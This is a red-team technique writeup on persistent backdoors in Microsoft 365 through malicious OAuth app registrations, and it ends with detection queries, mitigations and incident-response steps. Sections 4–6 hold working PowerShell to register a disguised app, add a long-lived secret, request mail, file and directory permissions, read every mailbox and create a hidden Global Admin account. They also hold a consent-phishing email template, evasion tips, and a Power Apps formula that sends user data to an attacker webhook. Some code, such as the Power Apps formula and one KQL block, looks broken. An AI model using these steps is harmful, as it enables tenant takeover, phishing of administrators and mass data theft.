# [PERSIST-SERVER-007]: SaaS Application Backdoor

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-SERVER-007 |
| **MITRE ATT&CK v18.1** | [T1505.003 - Server Software Component: Web Shell](https://attack.mitre.org/techniques/T1505/003/) (adapted for SaaS context) |
| **Tactic** | Persistence (TA0003) |
| **Platforms** | M365/Entra ID, SaaS Applications (cloud-hosted) |
| **Severity** | **Critical** |
| **CVE** | N/A (configuration-based attack) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | All Entra ID versions, all M365 workloads (Exchange Online, SharePoint Online, Teams, OneDrive) |
| **Patched In** | N/A - Requires policy enforcement and continuous monitoring |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Unlike traditional web shells (T1505.003) deployed to physical servers, SaaS backdoors leverage OAuth 2.0 and cloud application registration to establish persistence within cloud environments. An attacker with access to a compromised user account or administrative privileges can register a malicious application (OAuth app, custom connector, Power App, or Teams bot) that maintains access independently of user credentials. Once registered and authorized, the malicious application receives refresh tokens and API permissions, allowing it to:

1. **Access protected resources** (email, files, calendar, Teams messages) without interactive login
2. **Operate independently** even after the compromised account's password is reset or MFA is enforced
3. **Persist for months** until the application is discovered through audit logs
4. **Exfiltrate data** at scale using service-to-service authentication (no user involved)

**Attack Surface:** The attack targets SaaS application ecosystems, specifically:
- **Entra ID App Registrations** (OAuth applications registered in the tenant)
- **Multi-Tenant Apps** (cross-tenant malicious applications)
- **Delegated Consent Flows** (phishing users into granting permissions)
- **Service Principals** (background applications with assigned permissions)
- **Custom Connectors** (Power Automate, Logic Apps)
- **Power Apps** (low-code platform for malicious applications)
- **Teams Bot Registrations** (malicious bots with messaging permissions)

**Business Impact:** **Complete cloud tenant compromise with data exfiltration at scale.** An attacker can read all emails, download all files from SharePoint/OneDrive, access Teams messages and channel data, modify user accounts, create new admin accounts, grant themselves additional permissions, and pivot to on-premises Active Directory via hybrid identity bridges (Azure AD Connect). If the malicious app has Global Admin permissions (or worse, can create Global Admin accounts), the attacker essentially owns the entire Microsoft 365 environment.

**Technical Context:** Malicious app registration takes seconds (just creating an Entra ID application). The attack is **extremely stealthy** because:
1. The application appears as legitimate internal software in the Entra ID portal
2. No sign-in events are logged in the victim tenant (actor tokens bypass normal sign-in logs)
3. Conditional Access policies don't apply to application permissions
4. Microsoft Graph API activity logs may not capture all actions (legacy Azure AD Graph has no logging)
5. The attack blends with normal automation and API usage

### Operational Risk
- **Execution Risk:** **Low** - Requires only a compromised user account or default permissions to register apps
- **Stealth:** **Very High** - Completely invisible in normal monitoring; requires specialized audit log hunting
- **Reversibility:** **No** - Once the app has accessed data, it's exfiltrated; revocation only prevents future access

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | Identity-2, Identity-3 | Ensure that only administrators can register applications; Ensure that user consent is restricted |
| **DISA STIG** | SI-12 | Information Security Monitoring and Alerting – Detect unauthorized application registrations |
| **CISA SCuBA** | Entra ID Baseline | Restrict non-admin app registrations; monitor for risky OAuth apps |
| **NIST 800-53** | AC-3, AC-6 | Access Enforcement; Least Privilege (apps should request minimum scopes) |
| **GDPR** | Art. 32 | Security of Processing – Prevent unauthorized applications from accessing personal data |
| **DORA** | Art. 9 | Protection and Prevention – Detect and prevent unauthorized software deployment in cloud environments |
| **NIS2** | Art. 21 | Cyber Risk Management – Continuous monitoring of cloud identity and access systems |
| **ISO 27001** | A.6.1.2 | Authorization of Information Processing Facilities (control who can register applications) |
| **ISO 27005** | Risk Scenario | "Compromise of Application Authorization" – Unauthorized applications obtaining valid permissions |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- **Basic**: Compromised user account (any tenant user can register an app if default permissions allow it)
- **Advanced**: Entra ID admin account (Global Admin, Cloud Application Admin)
- **Alternative**: Stolen app client secret or certificate from existing application

**Required Access:**
- Network access to Microsoft Entra ID (Azure portal, Graph API, or PowerShell)
- Authentication credentials (username/password) or stolen tokens

**Supported Versions:**
- **Entra ID:** All versions (formerly Azure Active Directory)
- **M365 Workloads:** Exchange Online, SharePoint Online, Teams, OneDrive for Business
- **SaaS Platforms:** Any platform using OAuth 2.0 and supporting custom applications

**Tools:**
- [Azure Portal](https://portal.azure.com/) (web-based app registration)
- [Azure PowerShell (Az Module)](https://learn.microsoft.com/en-us/powershell/azure/) (v10.0.0+)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (v2.50.0+)
- [Microsoft Graph PowerShell SDK](https://github.com/microsoftgraph/msgraph-sdk-powershell) (for automation)
- [Microsoft Graph Explorer](https://developer.microsoft.com/en-us/graph/graph-explorer) (API testing)
- [ROADtools](https://github.com/dirkjanm/ROADtools) (Entra ID enumeration and token generation)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Check Default App Registration Permissions

```powershell
# Connect to Entra ID
Connect-MgGraph -Scopes "Application.ReadWrite.All", "Directory.ReadWrite.All"

# Check if users can register applications (default: $true in most tenants)
$tenantSettings = Get-MgPoliciesAuthorizationPolicy
$tenantSettings | Select-Object -Property Id, DisplayName | Format-List

# Check the specific setting (Users can register applications)
# If the setting is $true, any user can register apps
# Navigate to Entra ID → User settings → App registrations to verify
```

**What to Look For:**
- If the setting is **True**, any compromised user can register a malicious app
- If the setting is **False**, you need Global Admin privileges

### Enumerate Existing Applications

```powershell
# List all applications in the tenant
Get-MgApplication -All | Select-Object Id, DisplayName, CreatedDateTime, PublisherName | Format-Table

# Get all service principals (registered apps with assigned permissions)
Get-MgServicePrincipal -All | Select-Object Id, DisplayName, AppId, AppDescription | Format-Table

# Check which apps have been granted admin consent
Get-MgServicePrincipal -All | Where-Object { $_.ServicePrincipalType -eq "Application" } | ForEach-Object {
    $appId = $_.AppId
    $displayName = $_.DisplayName
    $oauth2PermissionGrants = Get-MgOauth2PermissionGrant -Filter "clientId eq '$appId'"
    if ($oauth2PermissionGrants) {
        Write-Host "App: $displayName - Has OAuth2 Permissions"
    }
}
```

### Check for Risky Permissions

```powershell
# Get all apps with high-risk permissions (Mail.ReadWrite.All, Directory.ReadWrite.All)
Get-MgServicePrincipal -All | ForEach-Object {
    $sp = $_
    Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $sp.Id | Where-Object {
        $_.AppRoleId -match "Mail.ReadWrite|Directory.ReadWrite|User.Invite.All"
    } | ForEach-Object {
        Write-Host "High-Risk Permission on $($sp.DisplayName): $($_.PrincipalDisplayName)"
    }
}
```

### Linux/Azure CLI Reconnaissance

```bash
# List all applications
az ad app list --output table

# Get app with specific permissions
az ad sp list --filter "appOwnerOrganizationId eq '[tenant-id]'" --output table

# Check app registration details
az ad app list --query "[].{id:id, displayName:displayName, createdDateTime:metadata.createdDateTime}"
```

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: OAuth App Registration with Delegated Permissions (Silent Backdoor)

**Supported Versions:** All Entra ID versions

#### Step 1: Register a Malicious Application

**Objective:** Create a new OAuth application that appears legitimate but is fully controlled by the attacker

**Command (Azure Portal):**
1. Navigate to **Azure Portal** → **Entra ID** → **App registrations**
2. Click **+ New registration**
3. **Name:** `Microsoft 365 Sync Manager` (innocuous-sounding name)
4. **Supported account types:** `Accounts in any organizational directory (Any Azure AD directory – Multitenant)`
5. **Redirect URI:** `http://localhost:8080` (or attacker-controlled URL)
6. Click **Register**

**Command (PowerShell):**
```powershell
# Connect to Graph API
Connect-MgGraph -Scopes "Application.ReadWrite.All"

# Create a malicious application registration
$appParams = @{
    DisplayName = "Microsoft 365 Sync Manager"
    PublicClient = $false
    Owners = @()
}

$app = New-MgApplication @appParams

Write-Host "Application Created: $($app.Id)"
Write-Host "Application ID (Client ID): $($app.AppId)"
```

**Expected Output:**
```
Application Created: 550e8400-e29b-41d4-a716-446655440000
Application ID (Client ID): a1b2c3d4-e5f6-7890-abcd-ef1234567890
```

**What This Means:**
- The application is now registered in the tenant
- It has a unique Application ID (also called Client ID)
- It's visible to administrators in the Entra ID portal but blends with legitimate apps

**OpSec & Evasion:**
- Use names that mimic Microsoft services: "SharePoint Sync", "Exchange Connector", "Teams Integration"
- Use generic logos (copy Microsoft's logo or similar-looking icons)
- Create the app during high-activity periods to blend with normal app creation
- If possible, use a compromised low-level user account instead of your attacker account

#### Step 2: Create a Client Secret for Persistent Authentication

**Objective:** Generate credentials that allow the malicious app to authenticate without user interaction

**Command (PowerShell):**
```powershell
$appId = "550e8400-e29b-41d4-a716-446655440000"  # From Step 1

# Create a client secret (password credential)
$passwordCredParams = @{
    DisplayName = "Default"
    EndDateTime = (Get-Date).AddYears(2)  # 2-year expiration
}

$passwordCred = Add-MgApplicationPassword -ApplicationId $appId @passwordCredParams

Write-Host "Client Secret (Password): $($passwordCred.SecretText)"
Write-Host "Secret Expires: $($passwordCred.EndDateTime)"

# Save these credentials - you'll need them for authentication
# Also note: This secret is ONLY shown once, so copy it immediately
```

**Expected Output:**
```
Client Secret (Password): AbCdEfGhIjKlMnOpQrStUvWxYz1234567890==
Secret Expires: 2028-01-09 12:34:56
```

**What This Means:**
- The secret is a password that allows the app to authenticate as itself
- The attacker now has the credentials: `AppId` and `ClientSecret`
- These credentials can be used to request access tokens programmatically

**OpSec & Evasion:**
- Set expiration to 2+ years in the future (gives attackers long-term access)
- Store the secret securely (encrypted file, secure note)
- Only the app can authenticate with this secret; normal users cannot see it

**Troubleshooting:**
- **Error:** "The caller does not have permission to create client secrets"
  - **Cause:** Insufficient permissions (need Application Administrator or Global Admin)
  - **Fix:** Use an account with higher privileges

#### Step 3: Grant the Application Dangerous Permissions

**Objective:** Request API permissions that give the app access to mail, files, and user management

**Command (PowerShell):**
```powershell
$appId = "550e8400-e29b-41d4-a716-446655440000"
$app = Get-MgApplication -Filter "appId eq '$appId'"

# Get the service principal for this app
$sp = New-MgServicePrincipal -AppId $app.AppId -ErrorAction SilentlyContinue

# Add dangerous API permissions (without requiring user consent)
$requiredResourceAccess = @(
    @{
        ResourceAppId = "00000003-0000-0000-c000-000000000000"  # Microsoft Graph
        ResourceAccess = @(
            @{
                Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"  # User.Read.All
                Type = "Scope"
            },
            @{
                Id = "b633e1c5-b582-4048-a93e-9f11b44c7e96"  # Mail.ReadWrite.All
                Type = "Scope"
            },
            @{
                Id = "06da0dbc-49b3-46f5-8355-3ce8f3db36eb"  # Directory.ReadWrite.All
                Type = "Scope"
            },
            @{
                Id = "4e46008b-629b-43ba-ba14-13d440eb0a10"  # Files.ReadWrite.All (OneDrive/SharePoint)
                Type = "Scope"
            }
        )
    }
)

# Update the app with required resource access
Update-MgApplication -ApplicationId $app.Id -RequiredResourceAccess $requiredResourceAccess

Write-Host "Permissions added to application"
```

**What This Means:**
- The app now requests permissions to read email, files, users, and directory objects
- These are **delegated permissions** (app acts on behalf of users)
- If an admin grants consent, the app gets these permissions without future user involvement

**Dangerous Permission IDs:**
- `Mail.ReadWrite.All` - Read and write all mailboxes
- `Directory.ReadWrite.All` - Modify all directory objects (users, groups, roles)
- `Files.ReadWrite.All` - Access all files in SharePoint and OneDrive
- `User.Invite.All` - Invite external users (create guest accounts)
- `User.ManageIdentities.All` - Manage user identities (reset passwords, change MFA)

#### Step 4: Trick an Admin into Granting Consent

**Objective:** Get an administrator to grant admin consent, activating the app's permissions

**Consent Phishing Method (Using OAuth Phishing URL):**

```powershell
$tenantId = "your-tenant-id"
$clientId = "a1b2c3d4-e5f6-7890-abcd-ef1234567890"  # App ID
$redirectUri = "http://localhost:8080/callback"

# Build the OAuth consent request URL
$consentUrl = "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/authorize?" +
    "client_id=$clientId&" +
    "response_type=code&" +
    "scope=User.Read Mail.ReadWrite.All Directory.ReadWrite.All Files.ReadWrite.All&" +
    "redirect_uri=$redirectUri&" +
    "prompt=admin_consent"  # Force admin consent, not user consent

Write-Host "Send this URL to an admin (via phishing email):"
Write-Host $consentUrl
```

**Expected Output:**
```
https://login.microsoftonline.com/a1b2c3d4-e5f6-7890-abcd-ef1234567890/oauth2/v2.0/authorize?
client_id=a1b2c3d4-e5f6-7890-abcd-ef1234567890&
response_type=code&
scope=User.Read Mail.ReadWrite.All Directory.ReadWrite.All Files.ReadWrite.All&
redirect_uri=http://localhost:8080/callback&
prompt=admin_consent
```

**Phishing Email Template:**
```
Subject: ACTION REQUIRED: Update Your Microsoft 365 Integration

Hi [Admin Name],

Your Teams integration needs to be re-authenticated. Please click the link below to authorize the update:

[CONSENT_URL_HERE]

This is required to maintain connectivity with your email and collaboration services.

Thanks,
Microsoft IT Support
```

**What Happens When Admin Clicks:**
1. Admin signs in (if not already signed in)
2. Admin sees the permission request screen showing: "App wants access to: Read your email, Modify your files and contacts, Manage your user accounts"
3. Admin clicks "Accept"
4. The app is granted admin consent for all those permissions
5. The app can now access all users' data without further authentication

**OpSec & Evasion:**
- The consent phishing screen can be cloned to look 100% legitimate
- Use sender spoofing (email domain that looks similar to the organization's domain)
- Include logos and branding that match Microsoft's official communications
- Timestamp the email during business hours to avoid suspicion

#### Step 5: Acquire Access Tokens and Access Protected Resources

**Objective:** Use the granted permissions to access user data, emails, files, and directory information

**Command (Get Access Token):**
```powershell
$tenantId = "your-tenant-id"
$clientId = "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
$clientSecret = "AbCdEfGhIjKlMnOpQrStUvWxYz1234567890=="

# Request an access token using client credentials
$tokenUrl = "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token"

$body = @{
    grant_type    = "client_credentials"
    client_id     = $clientId
    client_secret = $clientSecret
    scope         = "https://graph.microsoft.com/.default"
}

$response = Invoke-RestMethod -Uri $tokenUrl -Method POST -Body $body
$accessToken = $response.access_token

Write-Host "Access Token Acquired (valid for 1 hour)"
Write-Host $accessToken
```

**Command (Access Email via Microsoft Graph API):**
```powershell
# Use the access token to read all emails
$headers = @{
    Authorization = "Bearer $accessToken"
    "Content-Type" = "application/json"
}

# Get all users
$usersUri = "https://graph.microsoft.com/v1.0/users?`$select=id,userPrincipalName,mail&`$top=999"
$users = (Invoke-RestMethod -Uri $usersUri -Headers $headers).value

foreach ($user in $users) {
    Write-Host "User: $($user.userPrincipalName)"
    
    # Get mailbox of each user
    $mailUri = "https://graph.microsoft.com/v1.0/users/$($user.id)/mailfolders/inbox/messages?`$top=10"
    $emails = (Invoke-RestMethod -Uri $mailUri -Headers $headers).value
    
    foreach ($email in $emails) {
        Write-Host "  Email: $($email.subject) from $($email.from.emailAddress.address)"
    }
}

# Export all emails to file
$exportUri = "https://graph.microsoft.com/v1.0/users?`$select=id,userPrincipalName" 
$allUsers = (Invoke-RestMethod -Uri $exportUri -Headers $headers).value
$allUsers | Export-Csv "C:\exfiltrated_users.csv"
```

**Command (Create Global Admin Account):**
```powershell
# Create a new user account with Global Admin role
$newUserUri = "https://graph.microsoft.com/v1.0/users"

$newUserBody = @{
    accountEnabled    = $true
    displayName       = "System Maintenance Account"
    mailNickname      = "sysmaint"
    userPrincipalName = "sysmaint@yourtenant.onmicrosoft.com"
    passwordProfile   = @{
        forceChangePasswordNextSignIn = $false
        password                      = "P@ssw0rd123!@#"
    }
} | ConvertTo-Json

$newUser = Invoke-RestMethod -Uri $newUserUri -Method POST -Headers $headers -Body $newUserBody
$newUserId = $newUser.id

# Assign Global Admin role to the new user
$roleUri = "https://graph.microsoft.com/v1.0/directoryRoles/members/`$ref"
$roleBody = @{
    "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/$newUserId"
} | ConvertTo-Json

Invoke-RestMethod -Uri $roleUri -Method POST -Headers $headers -Body $roleBody

Write-Host "Global Admin account created: sysmaint@yourtenant.onmicrosoft.com"
```

**What This Means:**
- The attacker now has unfettered access to all user data
- The attacker can create new admin accounts
- The attacker can read emails, files, Teams messages, calendar entries
- All activity appears as legitimate API usage (no user sign-in involved)

**OpSec & Evasion:**
- Spread data exfiltration over time (don't download everything at once)
- Use generic API calls that blend with normal Microsoft Graph usage
- Create admin accounts with names that sound like legitimate service accounts
- Access data during business hours to blend with normal user activity

---

### METHOD 2: Multi-Tenant App with Cross-Tenant Exploitation

**Supported Versions:** All Entra ID versions

#### Step 1: Register App as Multi-Tenant

**Objective:** Register an application that can operate across multiple Azure AD tenants

**Command (PowerShell):**
```powershell
# Register the app as multi-tenant
$appParams = @{
    DisplayName = "OneDrive Sync Helper"
    SignInAudience = "AzureADMultipleOrgs"  # Makes it multi-tenant
}

$multiTenantApp = New-MgApplication @appParams
```

**Step 2: Deploy in Victim Tenant and Extract Token**

**Objective:** Once a victim admin consents in another tenant, extract their token for reuse

**Command:**
```powershell
# In the victim tenant, the attacker can now:
# 1. Request a token from the victim tenant
# 2. Use that token to access victim tenant resources
# 3. Token is valid even if victim admin discovers and removes the app

$victimTenantId = "victim-tenant-id"
$tokenUrl = "https://login.microsoftonline.com/$victimTenantId/oauth2/v2.0/token"

$body = @{
    grant_type    = "client_credentials"
    client_id     = "attacker-app-id"
    client_secret = "attacker-secret"
    scope         = "https://graph.microsoft.com/.default"
}

$victimToken = (Invoke-RestMethod -Uri $tokenUrl -Method POST -Body $body).access_token
```

**What This Means:**
- The attacker can now access the victim tenant using their own app
- The token is valid for 1 hour and can be refreshed indefinitely
- Victim has no way to prevent token usage without disabling the entire app (which might break legitimate integrations)

---

### METHOD 3: Power App Backdoor (Low-Code Persistence)

**Supported Versions:** All M365 environments with Power Platform enabled

#### Step 1: Create a Power App with Data Exfiltration

**Objective:** Create a visually harmless Power App that exfiltrates data to attacker-controlled endpoint

**Command (Power Apps Studio):**
1. Go to **Power Apps** (powerapps.microsoft.com)
2. Click **+ Create** → **Canvas app**
3. Name: `System Performance Monitor`
4. Create a simple UI (button, text field)
5. Add the following code to the OnStart property:

```powershell
# Power Apps formula (use this in the Power App's code editor)

ClearCollect(
    AllUsers,
    'Office 365 Users'.SearchUserV2(
        {SearchTerm: "*"}
    ).value
);

ClearCollect(
    AllEmails,
    Office365Outlook.GetEmails(
        {folderPath: "inbox"}
    ).value
);

// Exfiltrate to attacker webhook
Notify(
    "Syncing...",
    NotificationType.Success
);

// Send data to attacker's webhook URL
ForAll(
    AllUsers,
    Patch(
        'AllUsers',
        ThisRecord,
        {
            Synced: true
        }
    );
    
    Patch(
        'http://attacker-webhook.com/exfil',
        ThisRecord,
        {
            Method: "POST",
            Headers: {"Authorization": "Bearer " & User().Email},
            Body: JSON(ThisRecord)
        }
    )
);
```

**What This Means:**
- The Power App automatically collects all users and their email when opened
- It sends the data to an attacker-controlled webhook
- The app appears to be a legitimate internal tool
- Very low detection likelihood because Power Apps are trusted by default

---

## 6. TOOLS & COMMANDS REFERENCE

### [Microsoft Graph PowerShell SDK](https://github.com/microsoftgraph/msgraph-sdk-powershell)

**Version:** 2.0+

**Installation:**
```powershell
Install-Module Microsoft.Graph
Update-Module Microsoft.Graph
```

**Key Commands:**
```powershell
# Connect to Graph
Connect-MgGraph -Scopes "Application.ReadWrite.All", "Directory.ReadWrite.All"

# Create app
New-MgApplication -DisplayName "MyApp"

# Add secret
Add-MgApplicationPassword -ApplicationId [AppId]

# Grant permissions
Update-MgApplication -ApplicationId [AppId] -RequiredResourceAccess $requiredResourceAccess

# List all apps
Get-MgApplication -All
```

---

### [ROADtools](https://github.com/dirkjanm/ROADtools)

**Purpose:** Enumerate Entra ID and generate tokens

**Installation:**
```bash
pip install roadrecon
```

**Usage:**
```bash
# Enumerate Entra ID
roadrecon gather

# Generate access token
roadrecon auth -u [user] -p [password]
```

---

## 7. SPLUNK DETECTION RULES

### Rule 1: Suspicious Application Registration with High-Risk Permissions

**Rule Configuration:**
- **Required Index:** `azure_activity`
- **Required Sourcetype:** `azure:aad:audit`
- **Alert Threshold:** Any new app registration requesting Mail.ReadWrite.All or Directory.ReadWrite.All
- **Applies To Versions:** All

**SPL Query:**
```spl
index=azure_activity operationName="Add application" 
| search properties.appId=* 
| stats count by properties.displayName, properties.appId, InitiatedBy.user.userPrincipalName, _time
| where count > 0
| table _time, properties.displayName, properties.appId, InitiatedBy.user.userPrincipalName
```

**What This Detects:**
- New applications registered in the tenant
- Associates the app name, ID, and creator
- Helps identify suspicious naming patterns

---

### Rule 2: Admin Consent Granted to OAuth Applications

**SPL Query:**
```spl
index=azure_activity operationName="Consent to application" OR operationName="Grant admin consent"
| search properties.consentType=AllPrincipals
| stats count by properties.displayName, properties.clientAppId, InitiatedBy.user.userPrincipalName, _time
| where count > 0
```

**What This Detects:**
- When admin consent is granted to an app
- Which admin granted consent (potential targeted phishing)
- Which app received consent

---

## 8. MICROSOFT SENTINEL DETECTION

### Query 1: Malicious OAuth App Registration and Consent

**Rule Configuration:**
- **Required Table:** `AuditLogs`
- **Alert Severity:** **Critical**
- **Frequency:** Run every 5 minutes

**KQL Query:**
```kusto
AuditLogs
| where OperationName in ("Add application", "Add service principal")
| extend AppId = tostring(TargetResources[0].id)
| extend AppDisplayName = tostring(TargetResources[0].displayName)
| join kind=leftouter (
    AuditLogs
    | where OperationName in ("Consent to application", "Admin consent")
    | extend AppId = tostring(parse_json(tostring(parse_json(Properties).targetResources))[0].id)
) on AppId
| where ResultDescription contains "success"
| project TimeGenerated, InitiatedByUser=InitiatedBy.user.userPrincipalName, AppDisplayName, AppId, OperationName
```

**What This Detects:**
- New apps registered AND then granted admin consent
- Potential backdoor persistence via OAuth

---

### Query 2: Suspicious Microsoft Graph API Activity from Service Principals

**KQL Query:**
```kusto
CloudAppEvents
| where Application == "Microsoft Graph"
| where ActionType in ("Get", "Post", "Patch", "Delete")
| where RawEventData.AppId != ""  // Not user interactive
| where RawEventData.RequestUri contains "users" OR RawEventData.RequestUri contains "mail" 
| summarize EventCount = count() by RawEventData.AppId, RawEventData.UserAgent, bin(TimeGenerated, 5m)
| where EventCount > 100  // High volume of API calls
```

---

## 9. WINDOWS EVENT LOG MONITORING

Event logs don't directly capture SaaS OAuth activity. However, monitor for:

**Event ID: 4688 (Process Creation)**
- Look for PowerShell spawning with Microsoft Graph API connections
- Pattern: `powershell.exe` → `Invoke-RestMethod` with Microsoft Graph URL

**Manual Configuration:**
1. Enable **Process Creation** auditing via Group Policy
2. Create alerts for PowerShell connecting to `https://graph.microsoft.com`

---

## 10. MICROSOFT DEFENDER FOR CLOUD

### Detection Alert: Suspicious OAuth Application Activity

**Alert Name:** "Unusual OAuth app activity detected"
- **Severity:** **High**
- **Description:** An OAuth app registered in your tenant is performing unusual operations (bulk user enumeration, mailbox access across many users)
- **Remediation:**
  1. Go to **Azure Portal** → **Entra ID** → **App registrations**
  2. Find the suspicious app
  3. Click **Delete** to remove it
  4. Revoke all permissions: **Permissions** → Select permissions → **Revoke admin consent**

---

## 11. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

### Query: Track OAuth App Consent Events

```powershell
Search-UnifiedAuditLog -Operations "Add application", "Consent to application", "Admin consent" `
  -StartDate (Get-Date).AddDays(-30) `
  | Export-Csv -Path "C:\oauth_audit.csv" -NoTypeInformation
```

**Fields to Analyze:**
- `ObjectId`: Application ID
- `UserId`: Admin who granted consent
- `CreationTime`: When the action occurred
- `ResultStatus`: Success/Failure

---

## 12. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Restrict Non-Admin App Registrations**

Prevent regular users from creating malicious apps.

**Manual Steps (Azure Portal):**
1. Go to **Azure Portal** → **Entra ID** → **User settings**
2. Under **App registrations**, set **Users can register applications** to **No**
3. Save changes

**Manual Steps (PowerShell):**
```powershell
# Restrict app registration to admins only
Update-MgPolicyAuthorizationPolicy -DefaultUserRolePermissions @{
    AllowedToCreateApps = $false
}
```

---

**2. Enforce Admin Consent Requirement**

Prevent users from granting permissions; require admin approval.

**Manual Steps:**
1. Go to **Entra ID** → **Enterprise applications** → **Consent and permissions** → **User consent settings**
2. Set **User consent for applications** to **Do not allow user consent**
3. Set **Admin consent requests** to **Allow users and admins to request admin consent**

---

**3. Block Risky Permissions**

Create policies that prevent applications from requesting dangerous scopes.

**Manual Steps:**
1. Go to **Entra ID** → **App registrations**
2. For each admin-managed app, review **API permissions**
3. Remove unnecessary permissions
4. Set **Mail.ReadWrite.All**, **Directory.ReadWrite.All** to **require admin consent only**

---

### Priority 2: HIGH

**4. Implement Conditional Access for App Registration**

**Manual Steps:**
1. Go to **Entra ID** → **Security** → **Conditional Access** → **+ New policy**
2. Name: `Restrict App Registration to Specific Groups`
3. **Assignments:**
   - **Users:** Select specific groups (e.g., IT Admins only)
   - **Cloud apps:** Filter for app registration endpoints
4. **Conditions:**
   - **Device state:** Require device to be compliant
   - **Locations:** Allow only corporate IPs
5. **Access controls:** Require MFA
6. Enable: **On**

---

**5. Monitor OAuth App Lifecycle**

Set up alerts for new app registrations.

**Manual Steps (Log Analytics):**
1. Create a Log Analytics query to alert on new apps:

```kusto
AuditLogs
| where OperationName == "Add application"
| where ResultDescription == "success"
| project TimeGenerated, InitiatedBy=InitiatedBy.user.userPrincipalName, AppName=TargetResources[0].displayName
```

2. Save as an Analytics Rule in Sentinel
3. Set alert frequency: Every 5 minutes
4. Set threshold: > 0 (alert on any new app)

---

### Access Control & Policy Hardening

**6. Conditional Access: Block Legacy Authentication**

```kusto
ConditionalAccessPolicies
| Create policy: "Block Legacy Auth for Apps"
| Conditions: ClientApps = "Legacy Authentication Clients"
| Access Control: Block
```

**Validation Command (Verify Mitigations):**
```powershell
# Verify app registration restrictions
$authPolicy = Get-MgPolicyAuthorizationPolicy
$authPolicy | Select-Object DefaultUserRolePermissions

# Expected Output: AllowedToCreateApps: False (if secure)

# Check user consent settings
Get-MgPolicyConsentRequestPolicy
```

**Expected Output (If Secure):**
```
AllowedToCreateApps     : False
AllowedToCreateSecurityGroups : False
```

---

## 13. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Suspicious Apps:**
- Apps created outside normal business hours
- Apps with names mimicking Microsoft services (OneDrive Sync, Teams Helper, etc.)
- Apps requesting `Mail.ReadWrite.All`, `Directory.ReadWrite.All`, `User.Invite.All` permissions
- Multi-tenant apps registered in single-tenant environment

**Suspicious Consent Events:**
- Admin consent granted via phishing URL (look for `prompt=admin_consent` in audit logs)
- Consent granted by recently compromised account
- Consent granted to unknown application

**Suspicious API Activity:**
- Service principals making bulk `GET /users` requests (user enumeration)
- Service principals accessing all mailboxes via Exchange Online API
- Service principals creating new user accounts or assigning admin roles

---

### Forensic Artifacts

**Cloud Audit Logs:**
- `AuditLogs`: Look for "Add application" and "Consent to application" events
- `AuditLogs`: Look for "Add app role assignment" showing risky permissions
- `CloudAppEvents`: Look for high-volume Graph API calls from service principals

**Application Details:**
- App creation date
- App creator (compromised user)
- Permissions granted (Mail.ReadWrite.All = high-risk)
- Secret creation dates (older secrets = longer persistence)
- Last sign-in time of the app

---

### Response Procedures

**1. Isolate:**

```powershell
# Disable the malicious app
Update-MgServicePrincipal -ServicePrincipalId [SuspiciousAppId] -AccountEnabled $false

# Alternatively, delete the app entirely
Remove-MgApplication -ApplicationId [SuspiciousAppId]
```

**2. Collect Evidence:**

```powershell
# Export audit logs showing app usage
Search-UnifiedAuditLog -Operations "Add application", "Consent to application" `
  -StartDate (Get-Date).AddDays(-30) `
  | Export-Csv -Path "C:\Investigation\app_audit.csv"

# Export all apps and their permissions
Get-MgApplication -All | Export-Csv -Path "C:\Investigation\all_apps.csv"

# Export service principals with recent activity
Get-MgServicePrincipal -All | Where-Object { $_.LastPasswordChangeDateTime -gt (Get-Date).AddDays(-30) } `
  | Export-Csv -Path "C:\Investigation\recent_apps.csv"
```

**3. Remediate:**

```powershell
# Revoke all tokens issued to the app
Revoke-MgUserSignInSession -UserId [AffectedUserId]

# Reset all passwords that may have been compromised
Set-MgUserPassword -UserId [AffectedUserId] -NewPassword (ConvertTo-SecureString -String "NewP@ssw0rd123" -AsPlainText -Force)

# Revoke admin consent from the app
Remove-MgServicePrincipal -ServicePrincipalId [SuspiciousAppId]

# Check for and remove any additional admin accounts created by attacker
Get-MgUser -Filter "displayName contains 'System' or displayName contains 'Sync'" | Format-List
```

---

## 14. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-002] Consent Grant OAuth Attack | Attacker tricks user into authorizing malicious app via phishing |
| **2** | **Credential Access** | [CA-UNSC-010] Service Principal Secrets Harvesting | Attacker extracts OAuth app credentials from Key Vault or config |
| **3** | **Privilege Escalation** | [PE-ACCTMGMT-001] App Registration Permissions Escalation | Attacker adds dangerous permissions to existing app registration |
| **4** | **Current Step** | **[PERSIST-SERVER-007]** | **Attacker registers malicious OAuth app, achieves persistence** |
| **5** | **Collection** | [C-CLOUD-001] Cloud Data Exfiltration via APIs | Attacker uses app credentials to bulk-export emails, files, user data |
| **6** | **Impact** | [I-RANSOM-001] Tenant-Wide Encryption | Attacker uses app to encrypt all SharePoint sites and mailboxes |

---

## 15. REAL-WORLD EXAMPLES

### Example 1: Proofpoint OAuth Backdoor Campaign (2025)

- **Target:** Enterprise Microsoft 365 environments
- **Timeline:** June 2025 – Ongoing
- **Technique Status:** Actors registered internal OAuth apps with names like "test", "helper", "sync"
- **Impact:**
  - Phishing campaigns lured admins to grant consent
  - Apps accessed Exchange Online (all mailboxes), SharePoint (all sites), OneDrive (all files)
  - Even after password reset, apps continued functioning
  - Average dwell time before discovery: 45+ days
- **Reference:** [Proofpoint Blog: Weaponizing OAuth Applications for Persistent Cloud Access](https://www.proofpoint.com/us/blog/threat-insight/beyond-credentials-weaponizing-oauth-applications-persistent-cloud-access)

